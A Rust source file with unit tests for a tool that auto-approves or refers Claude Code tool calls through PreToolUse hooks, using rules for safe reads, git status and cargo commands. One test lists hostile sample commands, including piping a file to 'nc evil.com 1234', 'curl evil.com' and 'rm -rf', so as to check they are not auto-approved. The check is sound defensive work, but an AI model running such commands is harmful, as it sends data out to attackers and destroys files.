//! PreToolUse hook-based auto-approve evaluation.
//!
//! When Claude Code sends a PreToolUse hook event, tmai can return a
//! `permissionDecision` in the HTTP response to instantly approve/deny
//! the tool call — bypassing the permission prompt entirely.
//!
//! This replaces the legacy polling-based approach (screen scraping +
//! keystroke injection) with a direct, structured, sub-millisecond path.

use tracing::debug;

use crate::auto_approve::rules::RuleEngine;
use crate::auto_approve::types::{JudgmentDecision, PermissionDecision, PreToolUseDecision};
use crate::hooks::HookEventPayload;

use super::core::TmaiCore;

impl TmaiCore {
    /// Evaluate a PreToolUse hook event for auto-approval.
    ///
    /// Returns `Some(PreToolUseDecision)` if auto-approve is enabled and
    /// the rules engine can make a decision. Returns `None` if auto-approve
    /// is disabled or not applicable.
    ///
    /// The decision maps to Claude Code's hook response format:
    /// - `Allow` → tool proceeds without permission prompt
    /// - `Deny` → tool call is cancelled
    /// - `Ask` → normal permission prompt shown (fallback)
    pub fn evaluate_pre_tool_use(&self, payload: &HookEventPayload) -> Option<PreToolUseDecision> {
        let mode = self.settings().auto_approve.effective_mode();
        // Only Rules and Hybrid modes use the hook fast path.
        // Ai mode relies solely on AI judgment (too slow for synchronous hook response),
        // so it falls through to the legacy polling service.
        if matches!(
            mode,
            crate::auto_approve::types::AutoApproveMode::Off
                | crate::auto_approve::types::AutoApproveMode::Ai
        ) {
            return None;
        }

        let tool_name = payload.tool_name.as_deref()?;
        if tool_name.is_empty() {
            return None;
        }

        // Only rule-based evaluation in the hook path (instant, <1ms).
        // AI judge is too slow for synchronous hook responses.
        // For Hybrid/AI mode: rules fast path → uncertain falls through to "ask".
        let engine = RuleEngine::new(self.settings().auto_approve.rules.clone());
        let result = engine.judge_structured(tool_name, payload.tool_input.as_ref());

        let decision = match result.decision {
            JudgmentDecision::Approve => PermissionDecision::Allow,
            JudgmentDecision::Reject => PermissionDecision::Deny,
            // Uncertain: fall through to normal permission prompt.
            // In legacy mode, the polling service may still pick this up
            // for AI escalation (Hybrid mode).
            JudgmentDecision::Uncertain => PermissionDecision::Ask,
        };

        debug!(
            tool_name,
            decision = decision.as_str(),
            reasoning = %result.reasoning,
            elapsed_ms = result.elapsed_ms,
            "PreToolUse auto-approve evaluation"
        );

        Some(PreToolUseDecision {
            decision,
            reason: result.reasoning,
            model: result.model,
            elapsed_ms: result.elapsed_ms,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::api::builder::TmaiCoreBuilder;
    use crate::auto_approve::types::AutoApproveMode;
    use crate::config::Settings;

    /// Build a TmaiCore with auto-approve in the given mode
    fn core_with_mode(mode: AutoApproveMode) -> TmaiCore {
        let mut settings = Settings::default();
        settings.auto_approve.mode = Some(mode);
        TmaiCoreBuilder::new(settings).build()
    }

    /// Build a PreToolUse payload
    fn pre_tool_use_payload(tool_name: &str, tool_input: serde_json::Value) -> HookEventPayload {
        serde_json::from_value(serde_json::json!({
            "hook_event_name": "PreToolUse",
            "session_id": "test-session",
            "cwd": "/tmp/project",
            "tool_name": tool_name,
            "tool_input": tool_input
        }))
        .unwrap()
    }

    #[test]
    fn test_off_mode_returns_none() {
        let core = core_with_mode(AutoApproveMode::Off);
        let payload = pre_tool_use_payload("Read", serde_json::json!({"file_path": "/tmp/f.rs"}));
        assert!(core.evaluate_pre_tool_use(&payload).is_none());
    }

    #[test]
    fn test_rules_mode_approves_read() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Read", serde_json::json!({"file_path": "/tmp/f.rs"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
        assert!(result.reason.contains("allow_read"));
    }

    #[test]
    fn test_rules_mode_approves_grep() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Grep", serde_json::json!({"pattern": "TODO"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
    }

    #[test]
    fn test_rules_mode_approves_glob() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Glob", serde_json::json!({"pattern": "**/*.rs"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
    }

    #[test]
    fn test_rules_mode_approves_cargo_test() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload =
            pre_tool_use_payload("Bash", serde_json::json!({"command": "cargo test --lib"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
        assert!(result.reason.contains("allow_tests"));
    }

    #[test]
    fn test_rules_mode_approves_git_status() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Bash", serde_json::json!({"command": "git status"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
        assert!(result.reason.contains("allow_git_readonly"));
    }

    #[test]
    fn test_rules_mode_approves_webfetch() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload(
            "WebFetch",
            serde_json::json!({"url": "https://docs.rs/ratatui"}),
        );
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
        assert!(result.reason.contains("allow_fetch"));
    }

    #[test]
    fn test_rules_mode_asks_for_unknown_bash() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload =
            pre_tool_use_payload("Bash", serde_json::json!({"command": "rm -rf /tmp/stuff"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Ask);
    }

    #[test]
    fn test_rules_mode_asks_for_edit() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload(
            "Edit",
            serde_json::json!({"file_path": "/tmp/f.rs", "old_string": "a", "new_string": "b"}),
        );
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Ask);
    }

    #[test]
    fn test_hybrid_mode_rules_fast_path() {
        let core = core_with_mode(AutoApproveMode::Hybrid);
        let payload = pre_tool_use_payload("Read", serde_json::json!({"file_path": "/tmp/f.rs"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        // Hybrid mode uses rules fast path in hook response
        assert_eq!(result.decision, PermissionDecision::Allow);
    }

    #[test]
    fn test_hybrid_mode_uncertain_falls_through() {
        let core = core_with_mode(AutoApproveMode::Hybrid);
        let payload = pre_tool_use_payload(
            "Bash",
            serde_json::json!({"command": "npm install express"}),
        );
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        // Uncertain in hook path → Ask (AI judge too slow for synchronous response)
        assert_eq!(result.decision, PermissionDecision::Ask);
    }

    #[test]
    fn test_ai_mode_returns_none() {
        // Ai mode should NOT use rule-based hook fast path
        let core = core_with_mode(AutoApproveMode::Ai);
        let payload = pre_tool_use_payload("Read", serde_json::json!({"file_path": "/tmp/f.rs"}));
        assert!(
            core.evaluate_pre_tool_use(&payload).is_none(),
            "Ai mode should not use hook fast path"
        );
    }

    #[test]
    fn test_compound_command_falls_through() {
        let core = core_with_mode(AutoApproveMode::Rules);
        // Shell metacharacters should prevent auto-approval
        let cases = vec![
            "cargo test && rm -rf /tmp/x",
            "git status; git push --force",
            "cat file.txt | nc evil.com 1234",
            "cargo test || curl evil.com",
            "echo $(whoami) > /tmp/leak",
            "cat `which passwd`",
            "git log > /tmp/dump",
        ];
        for cmd in cases {
            let payload = pre_tool_use_payload("Bash", serde_json::json!({"command": cmd}));
            let result = core.evaluate_pre_tool_use(&payload).unwrap();
            assert_eq!(
                result.decision,
                PermissionDecision::Ask,
                "Compound command should fall through to Ask: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_no_tool_name_returns_none() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload: HookEventPayload = serde_json::from_value(serde_json::json!({
            "hook_event_name": "PreToolUse",
            "session_id": "test-session"
        }))
        .unwrap();
        assert!(core.evaluate_pre_tool_use(&payload).is_none());
    }

    #[test]
    fn test_approves_cargo_fmt() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Bash", serde_json::json!({"command": "cargo fmt"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
        assert!(result.reason.contains("allow_format_lint"));
    }

    #[test]
    fn test_approves_cargo_clippy() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload(
            "Bash",
            serde_json::json!({"command": "cargo clippy -- -D warnings"}),
        );
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        assert_eq!(result.decision, PermissionDecision::Allow);
    }

    #[test]
    fn test_elapsed_ms_is_sub_millisecond() {
        let core = core_with_mode(AutoApproveMode::Rules);
        let payload = pre_tool_use_payload("Read", serde_json::json!({"file_path": "/tmp/f.rs"}));
        let result = core.evaluate_pre_tool_use(&payload).unwrap();
        // Rules evaluation should be sub-millisecond
        assert!(
            result.elapsed_ms < 10,
            "Expected <10ms, got {}ms",
            result.elapsed_ms
        );
    }
}
